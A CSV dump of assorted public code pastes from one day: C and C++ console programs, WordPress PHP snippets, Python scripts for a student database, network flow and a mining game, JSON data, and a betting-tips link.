id,title,username,language,date,content
PTGLWU7U,tv 03-2024 task,spidersam,JSON,Friday 1st of March 2024 07:39:29 AM CDT,"[
  {
    ""name"": ""ZooTv-Live-01-03-2034.mp4"",
    ""url"": ""https://hello.freeconference.com/drive_files/download/69573865-8fa0-4537-bfe6-aed308662f46.mp4"",
    ""imageUrl"": ""https://i.imgur.com/uxVAdAkm.jpeg""
  },
  {
    ""name"": ""VOTA DEPESCE!"",
    ""url"": """",
    ""imageUrl"": ""https://i.imgur.com/uxVAdAkm.jpeg""
  }
]"
jA0K5rUp,Temporizar un tiempo con chrono,AntonioVillanueva,C++,Friday 1st of March 2024 07:12:38 AM CDT,"//Contrôle du temps avec la bibliothèque chrono c++
#include <iostream>
#include <chrono>
#include <thread>

#define TEMPO 4 
bool minutor(std::chrono::steady_clock::time_point debut, std::chrono::steady_clock::time_point& fin, std::chrono::seconds tempo) {
	
    std::chrono::seconds tempsEcoule = std::chrono::duration_cast<std::chrono::seconds>(fin - debut);

    if (tempsEcoule >= tempo) {
        return true;
    } else {
        fin = std::chrono::steady_clock::now();
    }

    return false;
}

int main() {
    std::chrono::steady_clock::time_point debut = std::chrono::steady_clock::now(); //debut t
    std::chrono::steady_clock::time_point fin = std::chrono::steady_clock::now();//fin t
    std::chrono::seconds tempo = std::chrono::seconds(TEMPO);//temps à contrôler

    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds());//sleep ms Un délai s'ajoute pour compliquer la situation
        
        if (minutor(debut, fin, tempo)) {
            std::cout << ""le temps est écoulé  "" << std::endl;
            return 0;
        }
    }

    return 0;
}"
gnGm2fE8,Shortcode Anzahl Kommentare,pixolin,PHP,Friday 1st of March 2024 07:07:48 AM CDT,"<?php
/*
 * Shortcode [kommentare] zur Ausgabe Anzahl der Kommentare
 */
function pix_kommentare() { 
	$comments_count = wp_count_comments();
    $message =  'Es gibt <strong>'.  esc_attr( $comments_count->approved ) . '</strong> Kommentare auf der Website.';
    $message .= '<br><strong>' . esc_attr( get_comments_number_text( 'Kein Kommentar ', 'Ein Kommentar ', '% Kommentare', $post_id ) ) . '</strong> in diesem Beitrag';

return $message; 

} 

add_shortcode('kommentare', 'pix_kommentare'); "
VLWUcnXX,Untitled,Roman9234,Python,Friday 1st of March 2024 06:41:16 AM CDT,"from connection import get_connection


@get_connection
def read_students_table(cur=None):
    cur.execute(""SELECT * FROM STUDENTS"")
    students = cur.fetchall()
    headers = ""№\tИмя\tФамилия\tОтчество\tПол\tНомер телефона""
    print(headers)
    for student in students:
        print(*student, sep=""\t"")
        
        
@get_connection
def read_teachers_table(cur=None):
    cur.execute(""SELECT * FROM teachers"")
    teachers = cur.fetchall()
    headers = ""№\tИмя\tФамилия\tОтчество\tПол\tНомер телефона""
    print(headers)
    for teacher in teachers:
        print(*teacher, sep=""\t"")

@get_connection
def read_subjects_table(cur=None):
    cur.execute(""SELECT subject_id, name FROM subjects"")
    subjects = cur.fetchall()
    headers = ""№\tНазвание предмета""
    print(headers)
    for subject in subjects:
        print(*subject, sep=""\t"")

@get_connection
def read_student_results(cur=None):
    read_students_table(cur)
    iden = """"
    while not iden.isdigit():
        iden = input(""У какого студента выведем табель успеваемости? "")
    iden = int(iden)
    try:
        cur.execute(""""""
                    SELECT *
                    FROM students
                    WHERE student_id=%d
                    """"""%(iden))
    except:
        print(""Нет такого ученика"")
        return None
    cur.execute(""""""
                SELECT first_name, last_name, pater_name, name, AVG(mark)
                FROM marks
                INNER JOIN students ON fk_student_id = students.student_id
                INNER JOIN subjects ON fk_subject_id = subjects.subject_id
                WHERE fk_student_id = %d
                GROUP BY first_name, last_name, pater_name, subjects.name;
                
                """"""%(iden))
    headers = ""Имя\tФамилия\t\tОтчество\tПредмет\t\tСредняя оценка""
    table =  cur.fetchall()
    print(headers)
    for record in table:
        print(*record, sep=""\t"")

"
5SbPiNTu,SSHNODE NOTICE,imKobz,JSON,Friday 1st of March 2024 06:20:22 AM CDT,"{
   ""notice"":""Please share our work, so we can continue our services, Thank you!"",
   ""updates"":[
      ""Added new openvpn servers."",
      ""Added ovpn config.""
   ]
}"
64Cv2GuX,max3,_who___,Python,Friday 1st of March 2024 06:13:48 AM CDT,"import numpy as np
from scipy.optimize import linprog
import matplotlib.pyplot as plt
import networkx as nx

# Define the directed graph representing the network flow
G = nx.DiGraph()

# Add nodes
G.add_node(""Source"")
G.add_node(""A"")
G.add_node(""B"")
G.add_node(""C"")
G.add_node(""Sink"")

# Add edges with capacities
G.add_edge(""Source"", ""A"", capacity=10)
G.add_edge(""Source"", ""B"", capacity=5)
G.add_edge(""A"", ""B"", capacity=3)
G.add_edge(""A"", ""C"", capacity=7)
G.add_edge(""B"", ""C"", capacity=4)
G.add_edge(""C"", ""Sink"", capacity=10)

# Visualize the original graph
plt.figure(figsize=(10, 5))
pos = nx.spring_layout(G)
nx.draw(G, pos, with_labels=True, node_size=1000, node_color='skyblue', font_weight='bold')
nx.draw_networkx_edge_labels(G, pos, edge_labels=nx.get_edge_attributes(G, 'capacity'), font_color='blue')
plt.title(""Original Network Flow Graph"")
plt.show()

# Linear programming problem setup
num_edges = len(G.edges)
c = np.zeros(num_edges)  # Cost function coefficients
A_ub = np.zeros((num_edges, num_edges))  # Inequality constraint matrix
b_ub = np.zeros(num_edges)  # Inequality constraint vector

# Set up the optimization problem
for i, (u, v, data) in enumerate(G.edges(data=True)):
    c[i] = -1  # Negative cost for maximizing the flow through each edge
    A_ub[i, i] = 1  # Flow on each edge is less than or equal to its capacity
    b_ub[i] = data['capacity']

# Flow conservation constraints
for node in G.nodes:
    if node not in ('Source', 'Sink'):
        out_edges = [i for i, (u, v) in enumerate(G.edges) if u == node]
        in_edges = [i for i, (u, v) in enumerate(G.edges) if v == node]
        for j in out_edges:
            A_ub[j, in_edges] = -1  # Flow out must equal flow in
            b_ub[j] = 0

# Solve the linear programming problem
result = linprog(c, A_ub=A_ub, b_ub=b_ub, method='highs')

# Update graph with flow values
flow_values = result.x
for i, (u, v) in enumerate(G.edges):
    G[u][v]['flow'] = flow_values[i]

# Visualize the solution graph with flow values
plt.figure(figsize=(10, 5))
nx.draw(G, pos, with_labels=True, node_size=1000, node_color='lightgreen', font_weight='bold')
edge_labels = {(u, v): f""{data['flow']:.2f}/{data['capacity']}"" for u, v, data in G.edges(data=True)}
nx.draw_networkx_edge_labels(G, pos, edge_labels=edge_labels, font_color='black')
plt.title(""Optimal Flow in the Network"")
plt.show()"
vHfepQy3,data856,TestGuy1,JSON,Friday 1st of March 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'b427a6ed07dfcee5ac56ae9cb2dd31a4d258d145a8d14ae80457810ce31b38e976a4bf21a73d7ed9e0477fafe0310fa554cd3a611c2b0bfc1aef296ed1a5d1de97c5099d4fcac73867e49859f562cb1c0910829ed7891e05dc93ba6c264c9df49c3c23ed68938ff3a1e6e50c6e7dbaf83d37c38281d5334d335df2223a3fc828',
  otherdata: [
    '74c5faa2661e82ae3b320f1d93a93099',
    '867ac9031112c16bc404f3f01091cd9f',
    '692d4cf2051afebecc5550e2b93f6429',
    '08e9f333115efaa035e5f7f1fc48aa36',
    'ccd9c0f2170590acd7009d8b732d13e7',
    'df73d1e4fb9737c5294ea3781d28ed62',
    '5063e6d0d1886f276fca9b41f5869584',
    '548f71cc45ff66afa4460432a9478c1b'
  ]
}"
cYvUfUas,sg,PIBogdanov,C,Friday 1st of March 2024 05:54:26 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <Windows.h>
#include <conio.h>

#pragma warning(disable : 4996)

#define MaxCharacters 100

#define MinGroupsCount 1
#define MaxGroupsCount 6

#define MinStudentsInTheGroupCount 2
#define MaxStudentsInTheGroupCount 30

#define MinSubjectsCount 2
#define MaxSubjectsCount 10

#define MinGrade 2.0f
#define MaxGrade 6.0f

/*
typedef struct
{
	char** subjectNames;
	
	unsigned short subjectsCount;
} Subject;

typedef struct
{
	Subject* subjects;

	float** grades;

	char** studentNames;

	char** facultyNumbers;
} Student;

typedef struct
{
	Student* students;

	unsigned short* studentsInTheGroupsCount;

	char** groupNames;

	unsigned short groupsCount;
} Group;

typedef struct
{
	Group* groups;

	char** majorNames;

	unsigned short majorsCount;
} Major;

typedef struct
{
	Major* majors;

	char** facultyNames;

	unsigned short facultiesCount;
} Faculty;

typedef struct 
{
	Faculty* faculties;

	char** universityNames;

	unsigned short universitiesCount;
} University;
*/

typedef struct
{
	float** grades;

	char** studentNames;

	char** facultyNumbers;

	char** subjectNames;

	unsigned short studentsInTheGroupCount;

	unsigned short subjectsCount;
} Student;

void inputStudentsInTheGroupCount(Student*);

void initializeStudentsInTheGroupCount(Student*, unsigned short);

void inputSubjectsCount(Student*);

void initializeSubjectsCount(Student*, unsigned short);

void inputSubjectNames(Student*);

void initialiseSubjectNames(Student*, char[][MaxSubjectsCount]);

void freeSubjectNames(Student*);

void inputStudentNames(Student*);

void inputStudentName(Student*, char[][MaxCharacters]);

void initialiseStudentNames(Student*, char[][MaxSubjectsCount]);

void freeStudentNames(Student*);

void inputFacultyNumbers(Student*);

void inputFacultyNumber(Student*, char[][MaxCharacters]);

void initialiseFacultyNumbers(Student*, char[][MaxCharacters]);

void freeFacultyNumbers(Student*);

void inputGrades(Student*);

void inputGrade(Student*, float[][MaxSubjectsCount]);

bool isValidGrade(float);

void initialiseGrades(Student*, float[][MaxSubjectsCount]);

void freeGrades(Student*);

void inputStudentInformation(Student*);

void printStudentInformation(Student*);

void initialiseStructMembers(Student*);

void freeStructMembers(Student*);

void removeNewlineCharacterIfItExists(char*);

void pressTheEnterKeyToContinue();

void isCursorVisible(bool);

void clearTheInputBufferIfNeededAndTheScreen(bool, bool);

void mainMenu(Student*);

void displayMenu(char*[], unsigned short, unsigned short);

void menuControls(Student*, unsigned short*, unsigned short, bool*);

void searchForAStudent(Student*);

bool isStudentPresentInTheGroup(Student*, char[], unsigned short*);

void printInformationAboutTheStudent(Student*, unsigned short);

int main()
{
	isCursorVisible(false);

	Student students;

	initialiseStructMembers(&students);

	clearTheInputBufferIfNeededAndTheScreen(false, true);

	printStudentInformation(&students);

	pressTheEnterKeyToContinue();

	mainMenu(&students);

	return 0;
}

void inputStudentsInTheGroupCount(Student* students)
{
	unsigned short studentsInTheGroupCount;

	inputStudentsInTheGroupCount:
	printf(""How many students are in the group? [%hu - %hu]\nStudents in the group count: "", MinStudentsInTheGroupCount, MaxStudentsInTheGroupCount);
	scanf(""%hu"", &studentsInTheGroupCount);

	if ( (studentsInTheGroupCount < MinStudentsInTheGroupCount) || (studentsInTheGroupCount > MaxStudentsInTheGroupCount) )
	{
		printf(""\n\nInvalid input!\n\n"");

		goto inputStudentsInTheGroupCount;
	}

	initializeStudentsInTheGroupCount(students, studentsInTheGroupCount);
}

void initializeStudentsInTheGroupCount(Student* students, unsigned short studentsInTheGroupCount)
{
	students->studentsInTheGroupCount = studentsInTheGroupCount;
}

void inputSubjectsCount(Student* students)
{
	unsigned short subjectsCount;

	inputSubjectsCount:
	printf(""How many subjects do the students have? [%hu - %hu]\nStudents in the group count: "", MinSubjectsCount, MaxSubjectsCount);
	scanf(""%hu"", &subjectsCount);

	if ( (subjectsCount < MinSubjectsCount) || (subjectsCount > MaxSubjectsCount) )
	{
		printf(""\n\nInvalid input!\n\n"");

		goto inputSubjectsCount;
	}

	initializeSubjectsCount(students, subjectsCount);
}

void initializeSubjectsCount(Student* students, unsigned short subjectsCount)
{
	students->subjectsCount = subjectsCount;
}

void inputSubjectNames(Student* students)
{
	printf(""Input the names of the subjects:\n\n\n"");

	char subjectNames[MaxSubjectsCount][MaxCharacters] = { { '\0' } };

	for (unsigned short i = 0; i < students->subjectsCount; i++)
	{
		printf(""Subject %hu: "", i + 1);

		while (fgets(subjectNames[i], MaxCharacters, stdin) == NULL)
		{
			printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a new subject name.\n\nSubject %hu: "", MaxCharacters, i + 1);
		}

		removeNewlineCharacterIfItExists(subjectNames[i]);
	}

	initialiseSubjectNames(students, subjectNames);
}

void initialiseSubjectNames(Student* students, char subjectNames[][MaxCharacters])
{
	students->subjectNames = malloc(students->subjectsCount * sizeof(char*));

	for (size_t i = 0; i < students->subjectsCount; i++)
	{
		students->subjectNames[i] = strdup(subjectNames[i]);
	}
}

void freeSubjectNames(Student* students)
{
	for (size_t i = 0; i < students->subjectsCount; i++)
	{
		free(students->subjectNames[i]);
	}

	free(students->subjectNames);
}

void inputStudentNames(Student* students)
{
	printf(""Input the names of the students:\n\n\n"");

	char studentNames[MaxStudentsInTheGroupCount][MaxCharacters] = { { '\0' } };

	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %hu: \n"", i + 1);

		printf(""Name: "");

		while (fgets(studentNames[i], MaxCharacters, stdin) == NULL)
		{
			printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a new student name.\n\nName: "", MaxCharacters);
		}

		removeNewlineCharacterIfItExists(studentNames[i]);

		printf(""\n\n"");
	}

	initialiseStudentNames(students, studentNames);
}

void inputStudentName(Student* students, char studentNames[][MaxCharacters])
{
	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		if (!strcmp(studentNames[i], ""\0""))
		{
			while (fgets(studentNames[i], MaxCharacters, stdin) == NULL)
			{
				printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a new student name.\n\nName: "", MaxCharacters);
			}

			removeNewlineCharacterIfItExists(studentNames[i]);

			return;
		}
	}
}

void initialiseStudentNames(Student* students, char studentNames[][MaxCharacters])
{
	students->studentNames = malloc(students->studentsInTheGroupCount * sizeof(char*));

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		students->studentNames[i] = strdup(studentNames[i]);
	}
}

void freeStudentNames(Student* students)
{
	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		free(students->studentNames[i]);
	}

	free(students->studentNames);
}

void inputFacultyNumbers(Student* students)
{
	printf(""Input the faculty numbers of the students:\n\n\n"");

	char facultyNumbers[MaxStudentsInTheGroupCount][MaxCharacters] = { { '\0' } };

	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %hu: \n"", i + 1);

		printf(""Name: %s\n"", students->studentNames[i]);

		printf(""Faculty number: "");

		while (fgets(facultyNumbers[i], MaxCharacters, stdin) == NULL)
		{
			printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a faculty number.\n\nFaculty number: "", MaxCharacters);
		}

		removeNewlineCharacterIfItExists(facultyNumbers[i]);

		printf(""\n\n"");
	}

	initialiseFacultyNumbers(students, facultyNumbers);
}

void inputFacultyNumber(Student* students, char facultyNumbers[][MaxCharacters])
{
	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		if (!strcmp(facultyNumbers[i], ""\0""))
		{
			while (fgets(facultyNumbers[i], MaxCharacters, stdin) == NULL)
			{
				printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a faculty number.\n\nFaculty number: "", MaxCharacters);
			}

			removeNewlineCharacterIfItExists(facultyNumbers[i]);

			return;
		}
	}
}

void initialiseFacultyNumbers(Student* students, char facultyNumbers[][MaxCharacters])
{
	students->facultyNumbers = malloc(students->studentsInTheGroupCount * sizeof(char*));

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		students->facultyNumbers[i] = strdup(facultyNumbers[i]);
	}
}

void freeFacultyNumbers(Student* students)
{
	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		free(students->facultyNumbers[i]);
	}

	free(students->facultyNumbers);
}

void inputGrades(Student* students)
{
	printf(""Input the students' grades on each subject:\n\n\n"");

	float grades[MaxStudentsInTheGroupCount][MaxSubjectsCount];

	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %hu: \n"", i + 1);

		printf(""Name: %s\n"", students->studentNames[i]);

		printf(""Faculty number: %s\n"", students->facultyNumbers[i]);

		for (size_t j = 0; j < students->subjectsCount; j++)
		{
			inputAGrade:
			printf(""%s: "", students->subjectNames[j]);
			scanf(""%f"", &grades[i][j]);

			if (!isValidGrade(grades[i][j]))
			{
				printf(""\n\nIvalid grade! Input a new one.\n\n"");

				goto inputAGrade;
			}
		}

		printf(""\n\n"");
	}

	initialiseGrades(students, grades);
}

void inputGrade(Student* students, float grades[][MaxSubjectsCount])
{
	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		for (size_t j = 0; j < students->subjectsCount; j++)
		{
			if (grades[i][j] == 0.0f)
			{
				inputAGrade:
				scanf(""%f"", &grades[i][j]);

				if (!isValidGrade(grades[i][j]))
				{
					printf(""\n\nIvalid grade! Input a new one.\n\n%s: "", students->subjectNames[j]);

					goto inputAGrade;
				}

				return;
			}
		}
	}
}

bool isValidGrade(float grade)
{
	return (grade >= MinGrade) && (grade <= MaxGrade);
}

void initialiseGrades(Student* students, float grades[][MaxSubjectsCount])
{
	students->grades = malloc(students->studentsInTheGroupCount * sizeof(float*));

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		students->grades[i] = malloc(students->subjectsCount * sizeof(float));

		memcpy(students->grades[i], grades[i], students->subjectsCount * sizeof(float));
	}
}

void freeGrades(Student* students)
{
	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		free(students->grades[i]);
	}

	free(students->grades);
}

void inputStudentInformation(Student* students)
{
	printf(""Input information for each student in the group:\n\n\n"");

	char studentNames[MaxStudentsInTheGroupCount][MaxCharacters] = { { '\0' } };

	char facultyNumbers[MaxStudentsInTheGroupCount][MaxCharacters] = { { '\0' } };

	float grades[MaxStudentsInTheGroupCount][MaxSubjectsCount] = { { 0.0f } };

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %llu:\n\n"", i + 1);

		printf(""Name: "");
		inputStudentName(students, studentNames);

		printf(""Faculty number: "");
		inputFacultyNumber(students, facultyNumbers);

		for (size_t j = 0; j < students->subjectsCount; j++)
		{
			printf(""%s: "", students->subjectNames[j]);
			inputGrade(students, grades);
		}

		printf(""\n\n"");

		clearTheInputBufferIfNeededAndTheScreen(true, false);
	}

	initialiseStudentNames(students, studentNames);

	initialiseFacultyNumbers(students, facultyNumbers);

	initialiseGrades(students, grades);
}

void printStudentInformation(Student* students)
{
	clearTheInputBufferIfNeededAndTheScreen(false, true);

	printf(""Group information:\n\n\n"");

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %llu:\n\n"", i + 1);

		printf(""Name: %s\n"", students->studentNames[i]);

		printf(""Faculty number: %s\n"", students->facultyNumbers[i]);

		for (size_t j = 0; j < students->subjectsCount; j++)
		{
			printf(""%s: %.2f\n"", students->subjectNames[j], students->grades[i][j]);
		}

		printf(""\n\n"");
	}
}

void initialiseStructMembers(Student* students)
{
	inputStudentsInTheGroupCount(students);

	clearTheInputBufferIfNeededAndTheScreen(true, true);

	inputSubjectsCount(students);
	
	clearTheInputBufferIfNeededAndTheScreen(true, true);

	inputSubjectNames(students);

	clearTheInputBufferIfNeededAndTheScreen(false, true);

	if (false)
	{
		inputStudentNames(students);

		clearTheInputBufferIfNeededAndTheScreen(false, true);

		inputFacultyNumbers(students);

		clearTheInputBufferIfNeededAndTheScreen(false, true);

		inputGrades(students);
	}
	
	else
	{
		inputStudentInformation(students);
	}
}

void freeStructMembers(Student* students)
{
	freeSubjectNames(students);
	
	freeStudentNames(students);

	freeFacultyNumbers(students);

	freeGrades(students);
}

void removeNewlineCharacterIfItExists(char* string)
{
	size_t stringLength = strlen(string);

	if ( (stringLength > 0) && (string[stringLength - 1] == '\n') )
	{
		string[stringLength - 1] = '\0';
	}
}

// Function, which waits the user to press the ""ENTER / RETURN"" key

void pressTheEnterKeyToContinue()
{
	printf(""\n\n\nPress \""ENTER\"" to go back to the Main Menu"");

	while (_getch() != 13); // ""\r"" - The ""ENTER / RETURN"" key
}

// Function, which decides to either turn on or turn off the cursor by giving a bool value either ""true / 1"" or ""false / 0""

void isCursorVisible(bool isVisible)
{
	HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);

	CONSOLE_CURSOR_INFO cursorInfo;
	GetConsoleCursorInfo(consoleHandle, &cursorInfo);

	cursorInfo.bVisible = isVisible;
	SetConsoleCursorInfo(consoleHandle, &cursorInfo);
}

// Function, which clears the input buffer from the newline character and clears the screen

void clearTheInputBufferIfNeededAndTheScreen(bool clearBuffer, bool clearScreen)
{
	if (clearBuffer) 
	{
		char character = getchar();

		while ( (character != '\n') && (character != EOF) );
	}

	if (clearScreen)
	{
		system(""cls"");
	}
}

void mainMenu(Student* students)
{
	char* options[] = { { ""1. Search for a student"" }, { ""2. Option 2"" }, { ""3. Option 3"" }, { ""4. Exit"" } };

	unsigned short totalOptions = sizeof(options) / sizeof(options[0]);

	unsigned short selectedOption = 1;

	bool isExit = false;

	while (!isExit)
	{
		system(""cls"");

		displayMenu(options, selectedOption, totalOptions);

		menuControls(students, &selectedOption, totalOptions, &isExit);
	}
}

void displayMenu(char* options[], unsigned short selectedOption, unsigned short totalOptions)
{
	printf(""          Menu:\n\n"");

	for (size_t i = 0; i < totalOptions; i++)
	{
		printf(""%s%s\n"", (selectedOption == (i + 1)) ? ""--> "" : ""    "", options[i]);
	}
}

void menuControls(Student* students, unsigned short* selectedOption, unsigned short totalOptions, bool* isExit)
{
	char key = getch();

	switch (key)
	{
		case 'W': case 'w': case 72: // Up arrow key
		*selectedOption = (*selectedOption > 1) ? *selectedOption - 1 : totalOptions; break;

		case 'S': case 's': case 80: // Down arrow key
		*selectedOption = (*selectedOption < totalOptions) ? *selectedOption + 1 : 1; break;

		case 13: // Enter key
		switch (*selectedOption)
		{
			case 1: searchForAStudent(students); pressTheEnterKeyToContinue(); break;

			case 2: break;

			case 3: break;

			case 4: freeStructMembers(students); *isExit = true;
		}

		break;
	}
}

void searchForAStudent(Student* students)
{
	clearTheInputBufferIfNeededAndTheScreen(false, true);

	char studentName[MaxCharacters];

	unsigned short indexOfTheStudent = 0;

	inputAStudentName:

	printf(""Input a name of a student to search: "");

	while (fgets(studentName, MaxCharacters, stdin) == NULL)
	{
		printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a new name.\n\nInput a name of a student to search: "", MaxCharacters);
	}

	removeNewlineCharacterIfItExists(studentName);

	clearTheInputBufferIfNeededAndTheScreen(false, true);

	if (!isStudentPresentInTheGroup(students, studentName, &indexOfTheStudent))
	{
		printf(""There's no student with this name in this group.\n\n\n"");

		goto inputAStudentName;
	}

	printf(""Student with this name has been found.\n\n\n"");

	printInformationAboutTheStudent(students, indexOfTheStudent);
}

bool isStudentPresentInTheGroup(Student* students, char studentName[], unsigned short* indexOfTheStudent)
{
	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		if (!strcmp(students->studentNames[i], studentName))
		{
			*indexOfTheStudent = i;

			return true;
		}
	}

	return false;
}

void printInformationAboutTheStudent(Student* students, unsigned short indexOfTheStudent)
{
	printf(""Student %llu:\n\n"", indexOfTheStudent + 1);

	printf(""Name: %s\n"", students->studentNames[indexOfTheStudent]);

	printf(""Faculty number: %s\n"", students->facultyNumbers[indexOfTheStudent]);

	for (size_t j = 0; j < students->subjectsCount; j++)
	{
		printf(""%s: %.2f\n"", students->subjectNames[j], students->grades[indexOfTheStudent][j]);
	}
}"
06ZtXKx8,Add ellipsis [...] on the post archive,fahimmurshed,PHP,Friday 1st of March 2024 05:53:07 AM CDT,"/**
 * Theme's overridden of excerpt function
 */
function astra_the_excerpt() {

	$excerpt_type = apply_filters( 'astra_excerpt_type', astra_get_option( 'blog-post-content' ) );

	do_action( 'astra_the_excerpt_before', $excerpt_type );
	?>
		<div class=""ast-excerpt-container ast-blog-single-element"">
			<?php
			if ( 'full-content' === $excerpt_type ) {
				the_content();
			} else {
				the_excerpt();
			}
			?>
		</div>
	<?php

	do_action( 'astra_the_excerpt_after', $excerpt_type );
}

/**
 * Filter to change the excerpt more string to dots ...
 */
add_filter( 'excerpt_more', 'extended_excerpt_more' );
function extended_excerpt_more( $more ) {
	return '[...]';
}"
hZCyLaFG,tool,nq1s788,Python,Friday 1st of March 2024 05:31:31 AM CDT,"from random import choices


class Tool:
    rarity = 'Обычная'
    durability = 100
    ratio = 2
    hardness = [('Обычная', 2), ('Редкая', 1.25), ('Легендарная', 0.65)]
    probability = [50, 35, 15]

    def get_probability(self):
        for i in range(len(self.hardness)):
            if self.hardness[i][0] == self.rarity:
                return self.probability[i]

    def get_new_tool(self):
        self.rarity, self.ratio = choices(self.hardness, weights=self.probability)
        self.durability = 100


class Pickaxe(Tool):
    metal_hardness = 25

    def mine_metal(self):
        self.durability -= self.ratio * self.metal_hardness


class Shovel(Tool):
    dirt_hardness = 15

    def clear_dirt(self):
        self.durability -= self.ratio * self.dirt_hardness


def choose_option():
    print('Выберите действие:')
    print('1. добывать киркой;')
    print('2. копать лопатой;')
    print('3. статистика;')
    print('4. завершить игру.')
    print()
    return input('Ответ: ')


def start():
    events = (['жила', 'завал'], [20, 80])
    metal = 0
    dirt = 0
    pickaxe = Pickaxe()
    shovel = Shovel()
    print('Вы начинаете игру')
    print('Инструменты:')
    print('- ""' + pickaxe.rarity + '"" кирка', str(pickaxe.durability) + '/100')
    print('- ""' + shovel.rarity + '"" лопата', str(shovel.durability) + '/100')
    print()
    event = choices(events[0], weights=events[1])
    print('Герою попадается', event + '!')
    request = choose_option()
    while request != '4':
        if request == '1':
            if event == 'завал':
                print('Завалы нельзя расчищать киркой!')
                request = choose_option()
                continue
            pickaxe.mine_metal()
            if pickaxe.durability < 0:
                print('Кирка не выдержала, сломалась, металл не добыт')
                print('""' + pickaxe.rarity + '"" кирка разрушается!')
                pickaxe.get_new_tool()
                print('Герой достает из сумки ""' + pickaxe.rarity + '"" кирка с вероятностью', str(pickaxe.get_probability()) + '%')
            else:
                metal += 1
                print('Герой добывает 1 металл, Кирка', str(pickaxe.durability) + '/100')
"
5RZWeeE1,Soccer Prediction Betting Tips 01032024,livebetpro,PHP,Friday 1st of March 2024 05:22:49 AM CDT,https://www.livebetpro.com/soccer-prediction-betting-tips-01032024/
